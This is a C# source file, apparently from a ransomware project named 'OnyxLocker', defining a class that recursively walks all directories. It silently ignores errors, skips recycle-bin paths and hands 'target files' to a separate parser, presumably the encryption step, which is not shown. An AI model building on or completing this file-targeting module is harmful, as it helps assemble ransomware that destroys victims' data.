using System.IO;

namespace OnyxLocker
{
    internal class DirWalker
    {
        private IFileChecker FileChecker { get; set; }
        private IFileParser FileParser { get; set; }

        public DirWalker(IFileChecker fileChecker, IFileParser fileParser)
        {
            FileChecker = fileChecker;
            FileParser = fileParser;
        }

        /// <summary>
        /// Recursive function which attempts to browse all directories / files starting from a base directory
        /// </summary>
        /// <param name="startDirectory"></param>
        public void TraverseDirectories(string startDirectory)
        {
            try
            {
                // Process all the file in the directories
                var fileEntries = Directory.GetFiles(startDirectory);
                for (var i = 0; i < fileEntries.Length; i++)
                {
                    ProcessFile(fileEntries[i].ToLower());
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch
            {
            }

            try
            {
                // Recursive
                // Traverse the next found directory
                var subdirectoryEntries = Directory.GetDirectories(startDirectory);
                for (var i = 0; i < subdirectoryEntries.Length; i++)
                {
                    var subdirectory = subdirectoryEntries[i];
                    TraverseDirectories(subdirectory);
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch
            {
            }
        }

        /// <summary>
        /// Processes the file
        /// </summary>
        /// <param name="filePath"></param>
        private void ProcessFile(string filePath)
        {
            if (IsTargetFile(filePath))
            {
                FileParser.ParseFile(filePath);
            }
        }

        /// <summary>
        /// Checks if the file is a target file
        /// </summary>
        /// <param name="filePath"></param>
        /// <returns></returns>
        private bool IsTargetFile(string filePath)
        {
            return !filePath.Contains("recycle") && FileChecker.IsTargetFile(filePath);
        }
    }
}